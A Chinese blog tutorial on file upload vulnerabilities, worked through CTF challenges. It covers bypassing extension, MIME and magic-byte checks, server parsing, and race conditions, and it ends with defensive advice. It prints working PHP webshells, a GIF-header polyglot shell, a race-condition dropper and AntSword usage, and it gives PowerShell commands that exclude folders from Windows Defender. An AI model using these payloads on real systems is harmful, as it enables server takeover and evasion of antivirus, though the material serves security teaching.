---
translationKey: file-upload-security-guide
locale: zh-cn
routeSlug: file-upload-security-guide
title: 文件上传漏洞完整教学：校验、解析与条件竞争
excerpt: 从扩展名、Content-Type 与魔法数校验讲起，结合文件存储解析和条件竞争案例，梳理文件上传漏洞的验证思路与防御重点。
author: A1right
seoTitle: 文件上传漏洞完整教学：校验、解析与条件竞争
seoDescription: 系统梳理文件上传漏洞的扩展名、MIME、魔法数、文件解析与条件竞争场景，并总结安全存储和防御措施。
categoryKey: web-security
category: Web 安全
tags:
  - 文件上传
  - Web 安全
  - PHP
  - CTF
  - 条件竞争
visibility: public
publishMode: now
publishedAt: 2026-10-16
updatedAt: 2026-10-16
cover: /images/uploads/file-upload-security-guide-cover.jpg
coverAlt: 浅色背景中的动漫人物插画
contentType: original
allowRepost: allow-with-attribution
pinned: false
draft: false
---

## 一、文件上传漏洞到底是什么？

文件上传漏洞（File Upload Vulnerability）是 Web 安全中非常经典的一类漏洞，也是 CTF Web 方向的重点考点。

我们首先要记住：

文件上传漏洞的核心，不是网站允许上传文件，而是网站没有正确限制文件的类型、内容、存储位置或访问方式，导致攻击者能够上传并利用非预期的文件。

### 了解文件上传的完整业务流程。

例如，一个校园相册网站的上传功能：

用户选择照片 → 浏览器发送请求 → 服务端接收文件 → 校验文件 → 保存文件 → 返回文件地址 → 用户访问照片。

这就好比我们很熟悉的wx、QQ上传头像，不难理解

再或者说：

一个校园论坛允许用户上传头像。如果网站只检查文件名是否以 .jpg 结尾，却没有正确验证文件内容，那么攻击者就可能利用这个缺陷上传不符合预期的文件。

![文件上传教程截图](/images/uploads/file-upload-security-guide-01.png)

文件上传漏洞通常出现在上述某个环节。

验证不严：不该上传的文件被接受。

保存不当：危险文件被放在 Web 可访问的目录中。

解析不当：服务器把上传文件当作可执行代码处理。

访问控制不当：用户可以访问不属于自己的文件，或者访问内部文件

文件上传漏洞可能导致远程代码执行，也可能导致敏感文件泄露、文件覆盖、存储资源耗尽或客户端内容安全问题，具体取决于缺陷和运行环境。

## 二、文件上传漏洞的核心知识点

### CTF 中常见的考点，可以分成以下几类。

### 1. 文件扩展名校验

![文件上传教程截图](/images/uploads/file-upload-security-guide-02.png)

网站根据文件名后缀判断类型，例如 .jpg、.png。如果校验规则设计不合理，可能出现验证绕过。

#### 前端校验

例如，网页只允许选择 JPG 图片：

```text
<input type="file" accept=".jpg,.jpeg,.png">
```

这段代码中的 accept 主要用于提示浏览器的文件选择界面，并不是可靠的服务器端安全控制。

关键理解：前端限制不等于后端限制。

如果服务器没有独立验证，用户仍然可能通过其他 HTTP 客户端发送请求。

#### 后端扩展名校验

假设后端逻辑是：

```text
filename = uploaded_file.filenameif filename.endswith(".jpg"):    save_file(uploaded_file)else:    reject()
```

这段代码只检查文件名结尾，存在明显的设计问题：

没有可靠地验证文件真实类型。

没有处理文件名规范化问题。

没有考虑危险内容和存储目录的执行权限。

没有验证文件是否符合业务要求。

CTF 入门题经常围绕这类不严谨的校验逻辑设计。

#### 例题1：

![文件上传教程截图](/images/uploads/file-upload-security-guide-03.png)

![文件上传教程截图](/images/uploads/file-upload-security-guide-04.png)

我们可以先上传一些优质微信头像（正常的jpg/png）

![文件上传教程截图](/images/uploads/file-upload-security-guide-05.png)

可以看到直接返回了上传成功，以及返回给了我们文件所在的地址（大多数都是在uploads/这个路径下，很多时候可以碰碰运气）

我们直接访问

![文件上传教程截图](/images/uploads/file-upload-security-guide-06.png)

可以看到确实是我们的优质头像

#### 抓包观察：

我们抓个包观察一下

![文件上传教程截图](/images/uploads/file-upload-security-guide-07.png)

第一个请求拿响应头：

```text
HTTP/1.1 200 OK
Server: Apache/2.4.66 (Debian)
X-Powered-By: PHP/8.2.30
Content-Length: 6529
Content-Type: text/html; charset=UTF-8
```

![文件上传教程截图](/images/uploads/file-upload-security-guide-08.jpg)

点击图片可查看完整电子表格

我们直接去尝试上传一句话木马试试

#### 关于一句话木马：

文件上传漏洞是“入口”，一句话木马是“后门”。

文件上传漏洞：应用没有正确限制用户上传的文件，导致攻击者能把脚本文件写进服务器。

一句话木马：一个极短的服务端脚本，作用是接收外部请求里的指令，在服务器上执行并返回结果。

连接工具：攻击者用 Webshell 管理工具连接这个脚本，发送文件管理、命令执行、数据库操作等指令。

所以完整链条是：

上传点存在缺陷 -> 脚本文件被写入服务器 -> Web 服务器解析执行 -> 攻击者传参控制 -> 工具连接管理

一句话木马就是攻击者留在服务器上的极简 Web 后门，靠外部请求传入指令并执行。防御关键是防止写入、禁止执行、最小权限和持续监控。

#### 常见的一句话木马：

PHP
<?php @eval($_POST['cmd']); ?>              // 最经典，菜刀/蚁剑默认
<?php system($_GET["c"]); ?>

一段 <?php ... ?> 要能当木马用，必须同时满足三个条件：

文件被当 PHP 解析——上传到可解析目录、或通过文件包含（LFI）加载。本题的根因就是 uploads/ 没禁解析；

攻击者能访问到这个文件——有 URL 或能被 include；

参数可控——$_POST/$_GET 的内容由攻击者决定。

#### 一、<?php @eval($_POST['cmd']); ?> —— 代码执行型

逐字符拆：

```php
<?php  @  eval  (  $_POST['cmd']  )  ;  ?>
 │     │    │         │              │   │
 │     │    │         │              │   └─ PHP 闭合标签
 │     │    │         │              └───── 语句结束
 │     │    │         └──────────────────── 从 POST 体取 cmd 参数
 │     │    └────────────────────────────── 把"字符串"当 PHP 代码执行
 │     └─────────────────────────────────── 错误抑制符
 └───────────────────────────────────────── PHP 开始标签
```

四个关键点：

<?php ?>：告诉服务器这段要被 PHP 引擎解析。没有它，就是普通 HTML 文本。这也是"上传到可解析目录"为何是前提。

eval：它把传入的字符串当 PHP 代码解析执行。注意——eval 是语言构造，不是函数。这有两个后果：

它执行的是 PHP 代码，不是系统命令。你传 id 它不会跑 id，会报语法错；你得传 system('id');；

它不能用变量函数调用（$f='eval'; $f(...) 不行），这解释了后面讲免杀时为什么 eval 得用字符串拼接藏。

$_POST['cmd']：从请求体里取名为 cmd 的参数。用 POST 而不是 GET，是因为菜刀/蚁剑发的 PHP 代码往往很长（几十上百行），URL 放不下、且会被日志记录。

@：错误抑制符，压制该表达式产生的 warning/notice（比如 cmd 没传时的"未定义索引"、类型不匹配等），让响应输出保持干净，方便工具解析

数据流：

```text
攻击者 POST  cmd=<PHP代码>
        │
        ▼
  $_POST['cmd']  ──►  eval()  ──►  PHP 引擎解析并执行这段代码
```

实际用法（传什么就执行什么）：

```text
POST cmd=phpinfo();                       → 看环境
POST cmd=system('id');                    → 跑命令
POST cmd=echo file_get_contents('/etc/passwd');   → 读文件
POST cmd=$h='MYSQL...'; ...;              → 连数据库
```

为什么菜刀/蚁剑默认用它：因为 eval 是"万能入口"。工具把用户的每个操作（列目录、下载文件、执行命令、管理数据库）都翻译成一段 PHP 代码，扔给 eval 跑。一条 webshell = 一个 PHP 解释器，能力上限就是 PHP 的上限。

它的"坑"：eval 自己不输出任何东西。想看到结果，传进去的代码里必须有 echo/print/var_dump。这是学生第一个必踩的坑。

#### 二、<?php system($_GET["c"]); ?> —— 命令执行型

```text
<?php  system  (  $_GET["c"]  )  ;  ?>
 │      │           │          │
 │      │           │          └── 从 URL 查询串取 c 参数
 │      │           └───────────── 参数值 = 系统命令
 │      └───────────────────────── 执行系统命令，并自动输出结果
 └──────────────────────────────── PHP 标签
```

三个关键点：

system：调用系统 shell 执行命令（底层类似 /bin/sh -c "<命令>"），并把命令输出直接打印到响应里，返回最后一行。同类还有 exec（只返回最后一行、不自动输出）、shell_exec（返回全部输出、不自动输出）、passthru（直接输出二进制流，适合看图/下载）、反引号 `cmd`（等价 shell_exec）。

$_GET["c"]：从 URL 的 ?c= 取参数。这里用 GET 是因为命令通常很短（id、ls），放 URL 里方便；单双引号在数组下标里完全等价，"c" 和 'c' 没区别，别当成知识点。

没有 @：命令不存在会直接报错，无所谓——反正是自己在用。

数据流：

```text
攻击者 GET  ?c=id
        │
        ▼
  $_GET['c']  ──►  system()  ──►  /bin/sh -c "id"  ──►  结果直接回显
```

实际用法（传什么命令跑什么）：

```text
?c=id                       → uid=33(www-data)
?c=ls -la /                 → 列根目录
?c=cat /flag                → 读文件
?c=env                      → 看环境变量（本题 flag 就在这）
```

它的优势：简单直接，?c=id 立刻有结果，不需要懂 PHP 语法。本题我就是用它——因为拿 flag 不需要"万能入口"，一条命令就够。

我们先用get的演示一遍这个题目

<?php system($_GET["c"]); ?>

![文件上传教程截图](/images/uploads/file-upload-security-guide-09.png)

直接上传

![文件上传教程截图](/images/uploads/file-upload-security-guide-10.png)

![文件上传教程截图](/images/uploads/file-upload-security-guide-11.png)

木马完全正常，只是你打开时漏了 ?c=

![文件上传教程截图](/images/uploads/file-upload-security-guide-12.png)

![文件上传教程截图](/images/uploads/file-upload-security-guide-13.png)

在环境下得到flag

我们再演示一遍post的

![文件上传教程截图](/images/uploads/file-upload-security-guide-14.png)

如果出现了这种情况，不要担心，这是杀软实时保护在拦你

![文件上传教程截图](/images/uploads/file-upload-security-guide-15.png)

笑死我了，被自动删除了（这里是因为我新装的系统）

Windows Defender 卸不掉——Win10/11 起它是系统组件，"程序和功能"里没有卸载项，你现在 IsTamperProtected: True，连禁用都会被系统自动恢复。强删的代价：安全中心报错、Windows Update 可能挂、每次功能更新又回来、系统不稳。不值得。

你的真实需求是"文件别被删"，这个已经解决了。 我做了两件事：

新建了实验目录 C:\Users\A1right\Desktop\ctf-lab

把它加进 Defender 排除项（Get-MpPreference 确认已生效）

以后木马就放这个目录，创建、重命名、保存都不会再被拦。

#### 想加更多目录 / 换目录

用管理员 PowerShell（我这边的命令模板）：

```powershell
# 加一个目录
Add-MpPreference -ExclusionPath "D:\你的CTF目录"

# 加扩展名（可选，全盘 .php 都不查）
Add-MpPreference -ExclusionExtension "php"

# 查看当前所有排除项
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
```

![文件上传教程截图](/images/uploads/file-upload-security-guide-16.png)

上传之后，来到我们的关键软件--蚁剑

蚁剑（AntSword）是一款开源的 WebShell 管理客户端——它是攻击者/测试者本地用的图形化工具，用来连接、控制已经上传到目标服务器上的木马。

它本身不是木马。 这是最关键的一点：

![文件上传教程截图](/images/uploads/file-upload-security-guide-17.jpg)

点击图片可查看完整电子表格

蚁剑自己不会入侵任何东西。它是"遥控器"，木马才是"接收器"。没有木马，蚁剑连不上任何东西。

木马：

```php
<?php @eval($_POST['cmd']); ?>
                    ↑
                 这个 cmd 就是"密码"
```

蚁剑连接配置：

![文件上传教程截图](/images/uploads/file-upload-security-guide-18.jpg)

点击图片可查看完整电子表格

"密码"栏的值 = 木马里 $_POST['xxx'] 的那个 xxx。

木马写 $_POST['cmd'] → 密码栏填 cmd

木马写 $_POST['pass'] → 密码栏填 pass

木马写 $_POST['a'] → 密码栏填 a

蚁剑把要执行的代码，就 POST 到这个参数名上。参数名对不上，木马就收不到代码，连接失败。

![文件上传教程截图](/images/uploads/file-upload-security-guide-19.png)

进入终端后，输出env拿到flag

![文件上传教程截图](/images/uploads/file-upload-security-guide-20.png)

### 2. Content-Type 校验

![文件上传教程截图](/images/uploads/file-upload-security-guide-21.png)

HTTP 请求中的 Content-Type 用来声明内容类型。它是客户端提供的信息，不能单独作为文件安全性的可靠证明。

上传请求通常采用 multipart/form-data 格式。

一个简化的请求示意如下：

```text
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="avatar.jpg"
Content-Type: image/jpeg

[文件内容]
------Boundary--
```

这里有两个容易混淆的概念：

![文件上传教程截图](/images/uploads/file-upload-security-guide-22.jpg)

点击图片可查看完整电子表格

如果服务器仅根据声明的 MIME 类型判断文件是否安全，就可能被错误的客户端声明误导。

真正可靠的做法是结合文件内容检查、格式解析、业务限制和安全存储等措施。

#### 例题2：

ezfu_1

我们正常上传一句话木马，会提示只允许上传图片文件

![文件上传教程截图](/images/uploads/file-upload-security-guide-23.png)

我们抓包分析

![文件上传教程截图](/images/uploads/file-upload-security-guide-24.png)

我们把图片替换成提前准备好的一句话木马

![文件上传教程截图](/images/uploads/file-upload-security-guide-25.png)

上传成功，然后用蚁剑连接，这里就不多展示

![文件上传教程截图](/images/uploads/file-upload-security-guide-26.png)

![文件上传教程截图](/images/uploads/file-upload-security-guide-27.png)

成功得到flag

#### 问题 1：------WebKitFormBoundary6CjLnOfxIDR0tvPp 是什么？

它是 boundary（边界/分隔符）——用来把请求体切成多个"部分"。

#### 为什么需要它

一个表单可能同时传多个字段（用户名、头像、描述……）。这些数据要打包进一个请求体，就必须有个东西来分隔它们。boundary 就是那道"墙"。

#### 为什么是一串随机字符

因为请求体里可能有二进制数据（图片）。二进制里可能出现任何字节序列。所以分隔符必须选一个"在文件内容里绝对不会出现"的字符串——否则解析器会把文件内容里的巧合字节误当成分隔符，导致解析错乱。

Chrome 的格式固定是 ----WebKitFormBoundary + 16 位随机字母数字，保证唯一性。

#### 问题 2：为什么有两个 Content-Type？

因为它们在两个不同的层级——一个是"集装箱"，一个是"箱子里的货"。

```text
Content-Type: multipart/form-data; boundary=...   ← 【外层】整个请求的编码方式
...
Content-Disposition: form-data; name="image"; filename="1.php"
Content-Type: image/jpeg                            ← 【内层】这一部分的内容类型
```

![文件上传教程截图](/images/uploads/file-upload-security-guide-28.jpg)

点击图片可查看完整电子表格

类比：

外层 = "这是一个快递箱，里面装了多件物品，用隔板分开"；

内层 = "这一件物品是照片（image/jpeg）"。

这正是 MIME 绕过的核心：服务端如果检查文件类型，查的就是内层那个 Content-Type: image/jpeg——而它是客户端自己写的，随便改。

#### 逐行讲解整个数据包

```text
POST / HTTP/1.1                              ← 方法、路径、HTTP 版本
Host: docker.qingcen.net:37437               ← 目标主机（端口）
Content-Length: 206                          ← body 的字节长度（改了 body 就要改它）
User-Agent: Mozilla/5.0 ...                  ← 浏览器标识
Content-Type: multipart/form-data; boundary=...  ← 【外层】编码方式 + 分隔符
Accept: */*                                  ← 客户端能接受的响应类型
Origin: http://docker.qingcen.net:37437      ← 请求来源（CSRF 校验用）
Referer: http://docker.qingcen.net:37437/    ← 从哪个页面跳来的
Accept-Encoding: gzip, deflate, br           ← 接受的压缩算法
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8     ← 接受的语言
Connection: keep-alive                       ← 复用 TCP 连接

                                             ← 空行：头部与 body 的分界（必须有）

------WebKitFormBoundary6CjLnOfxIDR0tvPp     ← 第 1 部分开始（-- + boundary）
Content-Disposition: form-data; name="image"; filename="1.php"
                                             ↑ 字段名        ↑ 文件名
Content-Type: image/jpeg                     ← 【内层】这部分的类型

<?php @eval($_POST['cmd']); ?>               ← 文件内容（你换成的木马）
------WebKitFormBoundary6CjLnOfxIDR0tvPp--   ← 结束标记（这里应该带 --）
```

#### 为什么上传必须用 multipart/form-data

因为上传要传的是结构化数据：

```text
字段名（name） + 文件名（filename） + 文件内容 + 可能还有其他字段
```

这些只有 multipart 格式能表达。如果用 image/jpeg，body 就变成"一整块图片字节"，没有 name、没有 filename——服务端根本不知道这是哪个字段、叫什么名字。

#### 例题3：php后缀的绕过

ezfu_2

这个主要还是校验ct，但是对我们文件命名有了过滤

![文件上传教程截图](/images/uploads/file-upload-security-guide-29.png)

我们正常上传，直接返回文件类型不允许

那我们对后缀名进行爆破

![文件上传教程截图](/images/uploads/file-upload-security-guide-30.png)

![文件上传教程截图](/images/uploads/file-upload-security-guide-31.png)

直接开始攻击

![文件上传教程截图](/images/uploads/file-upload-security-guide-32.png)

发现成功绕过，然后就和前面一样，蚁剑链接就好，不再演示

![文件上传教程截图](/images/uploads/file-upload-security-guide-33.png)

### 3. 文件内容与文件头校验

![文件上传教程截图](/images/uploads/file-upload-security-guide-34.png)

服务器可能检查文件的实际内容或文件签名（Magic Bytes）。但仅检查文件头也不一定能证明文件安全。

某些格式具有特定的文件签名，例如常见 PNG 文件的开头字节为：

```text
89 50 4E 47 0D 0A 1A 0A
```

这类特征常被称为 Magic Bytes。

但必须理解：

文件头正确，不代表整个文件安全。

原因是文件可能包含额外数据，也可能利用复杂格式的解析行为。对于图片上传，通常应使用可信的图片处理库解码并重新生成图片，而不是只检查开头几个字节。

我们首先利用010打开正常的png/jpg观察一下，图片的结构

![文件上传教程截图](/images/uploads/file-upload-security-guide-35.png)

![文件上传教程截图](/images/uploads/file-upload-security-guide-36.png)

#### 一、图片类（上传绕过最常用）

![文件上传教程截图](/images/uploads/file-upload-security-guide-37.jpg)

点击图片可查看完整电子表格

#### 二、文档 / 压缩包

![文件上传教程截图](/images/uploads/file-upload-security-guide-38.jpg)

点击图片可查看完整电子表格

#### 三、音视频

![文件上传教程截图](/images/uploads/file-upload-security-guide-39.jpg)

点击图片可查看完整电子表格

#### 四、可执行文件（讲原理用）

![文件上传教程截图](/images/uploads/file-upload-security-guide-40.jpg)

点击图片可查看完整电子表格

#### 例题4：文件头绕过和php后缀

ezfu_3

![文件上传教程截图](/images/uploads/file-upload-security-guide-41.png)

这里上传我们的一句话木马发现失败

抓个包看看

![文件上传教程截图](/images/uploads/file-upload-security-guide-42.png)

我们去改变后缀试试

![文件上传教程截图](/images/uploads/file-upload-security-guide-43.png)

没有成功的

那我们怎么办？尝试修改文件头

![文件上传教程截图](/images/uploads/file-upload-security-guide-44.png)

我们用010去构造个这个

![文件上传教程截图](/images/uploads/file-upload-security-guide-45.png)

也不行，那我们再修改后缀试试呢

![文件上传教程截图](/images/uploads/file-upload-security-guide-46.png)

这样就ok了，然后和前面一样

还有一种方式

#### Windows 命令（cmd 里直接跑）

```bat
copy /b 1.gif + shell.txt shell.phtml
```

1.gif = 一张真 GIF 图片

shell.txt = 内容只有一行：<?php system($_GET["c"]); ?>

/b = 二进制模式

shell.phtml = 输出文件

验证通过：copy /b 拼出来 34 字节，内容 GIF89a<?php system($_GET["c"]); ?>，完全正确。

![文件上传教程截图](/images/uploads/file-upload-security-guide-47.png)

![文件上传教程截图](/images/uploads/file-upload-security-guide-48.png)

这种情况下直接把一个图片和一个一句话木马组合，构成木马图

但是很明显

方式1 我们能控制大小

方式2我们不能控制，而且往往相对来说会很大，一个图片的二进制数据还是蛮多的

我们来举个题目例子

#### 例题5：文件魔法数的绕过+文件大小的限制

![文件上传教程截图](/images/uploads/file-upload-security-guide-49.png)

![文件上传教程截图](/images/uploads/file-upload-security-guide-50.png)

简单看一下要求（你也可以上传文件试试），题目的意思就是让我们

1.上传jpg文件

2.大小不能大于30000字节

3.必须要有FFD8FF

才能上传成功，我们的文件上传才能成功‘

![文件上传教程截图](/images/uploads/file-upload-security-guide-51.png)

我们利用前面学到的方法生成一个文件

![文件上传教程截图](/images/uploads/file-upload-security-guide-52.png)

我们上传试试

![文件上传教程截图](/images/uploads/file-upload-security-guide-53.png)

它说尺寸大了，那我们应该怎么做？还记得我说过第一个方法能控制大小吗？

我们打开010

![文件上传教程截图](/images/uploads/file-upload-security-guide-54.png)

新建一个文本，把jpg的魔法数字复制进去，

![文件上传教程截图](/images/uploads/file-upload-security-guide-55.png)

然后把一句话木马也复制进去,我们保存成small.jpg

![文件上传教程截图](/images/uploads/file-upload-security-guide-56.png)

就能上传成功了

![文件上传教程截图](/images/uploads/file-upload-security-guide-57.png)

可以访问过去看看，没什么问题，那我们就得抓包改后缀了

![文件上传教程截图](/images/uploads/file-upload-security-guide-58.png)

![文件上传教程截图](/images/uploads/file-upload-security-guide-59.png)

上传成功，然后依旧用蚁剑链接

![文件上传教程截图](/images/uploads/file-upload-security-guide-60.png)

![文件上传教程截图](/images/uploads/file-upload-security-guide-61.png)

查看环境拿到flag

层

拦截逻辑

绕过点

1. MIME 白名单

只看客户端声明的 Content-Type（txt 声明 text/plain 被拒，PNG 内容声明 text/plain 也被拒）

声明 image/png 或 image/gif 即过

2. 后缀黑名单

.php、.pht、.PHP 返回 File type not allowed

.phtml 不在名单里，且 Debian 的 Apache 把 .phtml 交给 PHP 解析

3. 文件头（魔数）校验

非图片头返回 File header validation failed

加 6 字节 GIF89a 即可过

4. PHP 标签内容检测

扫 <?php（含 <?PHP，大小写不敏感）

<?=、<?、<script language="php"> 全都不查，而 PHP 5.6 三个都能执行

### 4. 文件存储与解析

![文件上传教程截图](/images/uploads/file-upload-security-guide-62.png)

即使危险文件被上传，能否产生代码执行，还取决于文件保存位置、Web 服务器配置和对应的解析器。

#### 一、先认识两个完全不同的概念：文件路径与 URL

假设一个网站的服务器上有这样的目录：

```text
/var/www/html/
├── index.php
├── login.php
└── uploads/
    ├── avatar.jpg
    └── test.php
```

这里要先理解两个概念。

#### 1. 文件系统路径是什么？

例如：

```text
/var/www/html/uploads/avatar.jpg
```

这是文件在服务器操作系统中的实际路径。

你可以把它理解为文件在电脑硬盘上的地址。

它告诉我们：文件在服务器的哪个目录里。

#### 2. URL 又是什么？

例如：

```text
https://example.com/uploads/avatar.jpg
```

这是用户通过浏览器访问资源的地址。

它告诉我们：用户可以通过哪个网络地址请求这个资源。

两者不是一回事。

服务器需要通过 Web 服务器配置，把收到的 URL 映射到某个文件或应用程序处理逻辑。

例如，在一种常见配置中：

![文件上传教程截图](/images/uploads/file-upload-security-guide-63.jpg)

点击图片可查看完整电子表格

这是为了帮助你理解而作的示例，并不是所有网站都采用这种映射方式。

核心结论：文件存在于服务器上，不代表用户一定能通过 URL 访问它。

服务器可以把文件保存在不对外开放的目录里，也可以对某些 URL 设置登录校验、权限限制或直接禁止访问。

#### 二、什么是 Web 根目录？

我们先看这条路径：

```text
/var/www/html/
```

它在很多常见部署方式中可以作为网站的 Web 根目录，也就是 Web Root 或 Document Root。

你可以把它理解为：Web 服务器默认从这个目录及其配置允许的范围内，查找需要直接提供给用户的文件。

例如：

```text
/var/www/html/
├── index.html
├── css/
├── images/
└── uploads/
```

如果服务器把 /var/www/html 配置为网站的文档根目录，并且没有其他访问限制，那么：

```text
/var/www/html/images/logo.png
```

可能对应浏览器中的：

```text
https://example.com/images/logo.png
```

因此，网站通常会把需要公开访问的图片、CSS、JavaScript 等静态资源放在 Web 服务器能够提供访问的目录中。

但这也会带来一个问题。

假如网站把用户上传的文件直接保存在：

```text
/var/www/html/uploads/
```

那么这些文件就可能处于 Web 可访问的范围内。

例如，服务器允许直接访问该目录时，用户可能访问：

```text
https://example.com/uploads/avatar.jpg
```

这本身不是漏洞，因为网站本来就可能需要展示用户头像。

真正需要关注的是：如果这个目录里出现了不应该被执行或公开的文件，服务器会怎么处理它们？

这就引出了下一个概念。

#### 三、文件能访问，为什么不代表代码能执行？

这是整个问题里最关键的地方。

假设服务器上有一个文件：

```text
/var/www/html/uploads/test.php
```

我们暂时不考虑它是怎么上传的，只研究用户访问它时会发生什么。

同一个文件，根据服务器的处理方式不同，可能产生完全不同的结果。

#### 情况 A：服务器把它当作普通文件

假如服务器没有把 .php 文件交给 PHP 解释器处理，而是把它当作普通文件返回，那么浏览器收到的可能是文件原始内容，或者服务器要求浏览器下载该文件。

比如文件内容是：

```text
<?php
echo "Hello";
?>
```

如果这段内容没有交给 PHP 解释器执行，服务器就不会因为看到 echo 而自动运行它。

这时，服务器实际上只是传输了一段文件内容。

如果它直接向浏览器返回了 PHP 源代码，还可能造成源代码泄露。因此，把脚本文件作为静态文件提供并不一定安全。

#### 情况 B：服务器把它交给 PHP 解释器

假设 Web 服务器配置了 PHP 处理机制，并且 /uploads/ 目录中的 PHP 文件也会被交给 PHP 解释器。

访问：

```text
https://example.com/uploads/test.php
```

请求可能经历这样的流程：

浏览器请求GET /uploads/test.php

Web 服务器根据 URL、文件后缀和服务器配置决定如何处理

PHP 解释器如果该请求被配置为 PHP 处理，就执行相应的 PHP 代码

浏览器收到响应例如页面内容为 Hello，而不是 PHP 源代码

在这种情况下，PHP 解释器执行代码，然后服务器把执行结果返回给浏览器。

因此，我们必须区分：

文件被访问：服务器能够响应针对该文件的请求。

文件被解释执行：服务器将文件交给相应的解释器或处理程序。

代码执行成功：文件中的代码实际运行，并产生了预期结果。

三者之间有联系，但并不等价。

另外，服务器上存在 PHP 环境也不代表所有目录中的 .php 文件都会执行。Web 服务器及 PHP 处理程序可能只对某些路径或特定请求启用脚本处理。

### 5.条件竞争

在 Web 安全中，条件竞争是指：程序的执行结果受到多个操作的执行顺序或时间影响，而程序没有正确处理这种并发关系，从而产生安全问题。

本来应该按顺序完成的一系列操作，因为多个请求同时执行，导致程序出现了意料之外的结果。

条件竞争也经常和一个术语一起出现：TOCTOU（Time of Check to Time of Use，检查时与使用时之间的时间差）。

它指的是：程序检查某个条件时，条件是成立的；但等程序真正使用相关资源时，这个条件可能已经发生变化。

#### 二、先用一个生活例子理解

假设一个仓库只允许有权限的人领取一件物品。

正常流程是：

检查你是否有领取资格。

确认物品还在。

把物品交给你。

更新库存记录。

如果两个人几乎同时来领取最后一件物品，可能出现这样的情况：

![文件上传教程截图](/images/uploads/file-upload-security-guide-64.png)

问题并不是库存检查本身一定有错误，而是两个请求都在库存尚未更新时，通过了检查。

这就是典型的条件竞争。

我们用一个银行取钱的例子，把条件竞争讲透。你只要理解这个例子，之后再看文件上传中的条件竞争，就容易多了。

#### 一、正常情况下：账户有 1000 元

假设你的银行卡余额是 1000 元，你去 ATM 取 800 元。

正常流程应该是：

![文件上传教程截图](/images/uploads/file-upload-security-guide-65.png)

整个流程没有问题。

但问题来了：如果两次取款请求几乎同时到达，银行系统会怎么样？

#### 二、发生条件竞争：两次取款同时进行

假设你提交了一笔取款请求 A，系统正在处理时，又有一笔请求 B 被提交。

为了方便理解，先假设系统写得不够严谨：它把“检查余额”和“扣除余额”分成两个步骤，而且没有用事务或锁等机制协调并发请求。

此时，两次请求都想取 800 元。

![文件上传教程截图](/images/uploads/file-upload-security-guide-66.png)

问题就在这里。

请求 A 检查时，余额确实是 1000 元；请求 B 检查时，余额也还是 1000 元。

两个检查单独看都没错，但它们没有考虑到另一个请求也正在取钱。

#### 例题6：条件竞争

![文件上传教程截图](/images/uploads/file-upload-security-guide-67.png)

题目的描述也很清楚，条件大多数和上面那个题目一样

问题在于我们上传之后，文件就会被立马清除掉

![文件上传教程截图](/images/uploads/file-upload-security-guide-68.png)

于是我们用这个一句话木马

```text
<?php file_put_contents('a.php','<?php @eval($_POST[1]);?>');?>
```

#### 一、逐层拆解

```text
<?php file_put_contents('a.php','<?php @eval($_POST[1]);?>');?>
│      │                  │      │ │                     │
│      │                  │      │ └─ 第二层：要写入的"内容"（一个字符串）
│      │                  │      └─── 第一层：目标文件名
│      │                  └────────── 写入函数
│      └───────────────────────────── 外层 PHP 标签
```

最内层——一句话木马本体：<?php @eval($_POST[1]);?>

这是你要"生成"的那个东西。它自己被访问时：把 POST 参数 1 的值当作 PHP 代码执行。

$_POST[1]：超全局数组，取 POST 请求里名为 1 的参数。写 [1]（不加引号）等价于 ['1']——$_POST 的键永远是字符串，PHP 会把整数键自动转成 '1' 来查找，所以蚁剑里密码填 1 就能对上；

eval(...)：PHP 语言结构，把参数字符串当 PHP 代码解释执行。蚁剑发 1=payload 时，$_POST[1] 就是那段 payload，eval 一执行，结果回显；

@：错误抑制符，比如目标不可写、eval 报错时不输出警告，避免暴露信息。

第二层——被写入的字符串：'<?php @eval($_POST[1]);?>'

注意这里是单引号字符串。单引号里 $ 不解析变量、只需转义 \'，所以 $_POST[1] 会原封不动写进文件。

这一步是最大的坑：如果你用双引号 "<?php @eval($_POST[1]);?>"，PHP 会尝试把 $_POST[1] 插值——而当前这次请求（竞争命中的那次 GET）根本没传 1 参数，插值结果是空字符串，写出去的马变成 <?php @eval();?>，废了。所以必须单引号。

第三层——file_put_contents('a.php', $内容)

文件不存在就创建，存在就覆盖重写（没加 FILE_APPEND）；

返回写入的字节数，失败返回 false；

新文件属主是 PHP 进程用户（www-data），权限 0644——Apache 之后能正常读它、解析它。

路径 'a.php' 落在哪：相对路径基于 PHP 的当前工作目录。mod_php 执行主脚本前会 chdir 到主脚本所在目录，所以当 /uploads/shell.php 被执行时，CWD 就是 /var/www/html/uploads/，'a.php' 就写在 /var/www/html/uploads/a.php。不放心就用 DIR.'/a.php'，效果等价且不依赖这个行为。

最外层——<?php ... ?>

包住这行逻辑。执行完 file_put_contents 就直接结束，不输出任何东西（页面空白，这也是命中时"200 + 空/短 body"的原因）。

![文件上传教程截图](/images/uploads/file-upload-security-guide-69.png)

我们来到bp里面

![文件上传教程截图](/images/uploads/file-upload-security-guide-70.png)

第一个请求这样设置，空负载，无限重复

![文件上传教程截图](/images/uploads/file-upload-security-guide-71.png)

第二个和第一个的设置一样，就是这个并发数要提高

并发建议

角色

访问包（GET）

20~50（Turbo Intruder 可到 50~100）

撞窗主力，越密越好

上传包

5~10

造窗，够持续就行，多了互相挤

![文件上传教程截图](/images/uploads/file-upload-security-guide-72.png)

出现200了，我们就可以停止了

然后我们蚁剑去链接http://docker.qingcen.net:49240/uploads/a.php

![文件上传教程截图](/images/uploads/file-upload-security-guide-73.png)

密码是1，然后在env中得到flag

### 三、文件上传漏洞的危害

远程代码执行

在危险文件可被服务器解释执行等条件成立时，可能导致服务器端代码执行。这通常是高危场景，但不能仅凭上传成功就认定存在。

敏感信息泄露

如果文件被公开访问，可能泄露内部文档、用户资料、备份文件或其他敏感信息。

存储资源滥用

缺少文件大小、数量或频率限制，可能导致存储空间被大量占用。

存储型内容安全问题

即使文件不能执行，用户上传的 HTML、SVG 或其他主动内容仍可能在不安全的访问上下文中造成风险，具体取决于浏览器行为和站点隔离措施。

### 四、如何防御文件上传漏洞？

防御不能只依赖一个后缀黑名单。比较可靠的方案是多层控制。

服务端白名单：只允许业务真正需要的文件类型。

内容验证：检查文件格式，必要时使用可信库完整解码。

安全重命名：使用随机标识符作为存储名，不直接信任用户提供的文件名。

隔离存储：尽可能将文件放在 Web 根目录之外，或者使用独立的文件存储服务。

禁止执行：上传目录不应允许上传文件被当作服务器端代码执行。

